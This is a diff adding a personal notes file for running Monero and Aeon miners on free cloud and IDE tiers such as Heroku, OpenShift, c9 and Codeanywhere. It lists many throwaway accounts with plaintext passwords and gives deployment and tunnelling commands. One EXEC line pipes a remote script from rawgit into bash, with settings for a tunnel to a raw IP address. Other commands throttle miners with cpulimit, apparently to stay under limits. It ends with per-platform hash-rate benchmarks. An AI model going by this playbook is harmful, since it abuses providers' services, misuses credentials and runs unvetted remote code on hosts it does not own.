@@ -1,0 +1,150 @@
+## xmr
+
+heroku
+openshift
+vrmch
+ethernetservers
+cloudatcost
+c9
+codeany
+gullo
+fcph
+alpharacks
+vkl
+
+## aeon
+cloudatcost
+
+## protonmail
+willybstevens@protonmail.com
+willy123!
+judy_83@protonmail.com
+judy83123!
+
+## AOL
+pattyrichh@aol.com Pass123!
+
+## docker
+tyckerom
+tyckerom123!
+
+## openshift logins
+PAUSD_THREADS=1 PAUSD_VER=5
+PAUSD_THREADS=2 PAUSD_VER=4
+
+## oc commands
+- oc login...
+- oc new-project
+- bash oc-docker-login
+- bash oc-docker-push ## aboc image with exec support
+- oc create
+
+oc new-project busybox
+oc new-app busybox --allow-missing-images
+oc set image dc/busybox busybox=untoreh/containers:exec
+## oc set image dc/busybox busybox="untoreh/alpbase-openshift"
+oc scale --replicas=2 dc $OC_APP
+
+
+gost -L tcp://:8080/:12322 -F sni+tls://dpl-untoreh.1d35.starter-us-east-1.openshiftapps.com:443
+
+## heroku logins
+## command
+THREADS=4 PAUSD_VER=2 MASK=0x7
+EXEC='/bin/sh -c "export TNL_REMOTE=88.198.69.215 TNL_PORT=19814 TNL_PROTO=kcp PAUSD_RATE=800 PAUSD_THREADS=4 PAUSD_VER=2 ; \
+wget -qO- https://rawgit.com/untoreh/scripts/master/start-crt-1-sln | bash ; exec sleep infinity"'
+
+michelle112@mytrashmailer.com 
+michellepass112
+testlite
+
+aubreylbethel+Christina@protonmail.com
+Christina123!
+beardedjango
+
+willybstevens@protonmail.com
+willy123!
+jacknote
+
+judy_83@protonmail.com
+judy83123!
+
+hetznerserverdeals@gmail.com
+hetznerserverdeals123!
+baseserverapp
+
+## xnp heroku
+myvoice112233@gmail.com
+myvoice112233123!
+wss://alaskafraska.herokuapp.com
+## xnp cac1
+p.pkite.ga
+## xnp vrmchAged
+pp.pkite.ga
+
+
+## codeanywhere
+cpulimit -l240
+PAUSD_THREADS=3 VER=4
+...
+## c9.io projects https://ide.c9.io/untoreh/{project}
+PATH=.:$PATH cpulimit -l 52 -f -- httpd -c httpd.conf --daemonize
+/browser /test /tes2 /test3
+
+
+## stats
+# openshift
+cpu=8t (limited)
+bogomips=4600
+cache=45M
+2t 5mh 0 = 130H/s
+2t 5mh 0x1 = 120H/s
+2t 4mh 0 = 180H/s
+2t 4mh 0x1 = 130H/s
+3t 5mh 0 = 105H/s==
+3t 4mh 0 = 121H/s
+4t 3mh 0 = 150H/s
+4t 4mh 0 = 123H/s
+4t 4mh 0x7 = 120H/s
+4t 4mh 0x5 = 110H/s
+4t 4mh 0x1 = 100H/s
+3t 3mh 0 = 160H/s
+5t 3mh 0 = 105H/s==
+
+# virmachovz
+cpu=2t
+bogomips=4400
+cache=20M
+1t 4mh 0 = 45H/s
+1t 5mh 0 = 20H/s
+1t 3mh 0 = 28H/s
+1t 2mh 0 = 37H/s
+2t 5mh 0 = 66H/s
+2t 5mh 0x1 = 55H/s
+2t 4mh 0 = 78H/s
+2t 4mh 0x1 = 58H/s
+2t 3mh 0 = 60H/s
+2t 3mh 0x1 = 57H/s
+2t 2mh 0 = 55H/s
+
+# codeany
+cpu=8t (in couple of 2))
+bogomips=4400
+cache=20M
+3t 4mh 0101 = 45H/s
+2t 5mh 0 = 38H/s
+3t 3mh 0 = 28H/s
+
+# heroku
+cpu=8t
+bogomips=5000
+cache=25M
+3t 4mh = 190H/s
+4t 5mh = 144H/s
+3t 5mh = 133H/s
+2t 5mh = 165H/s
+2t 4mh = 190H/s
+3t 3mh = 192H/s 160
+4t 2mh = 213H/s
+4t 3mh = 100H/s
+4t 4mh = 80H/s
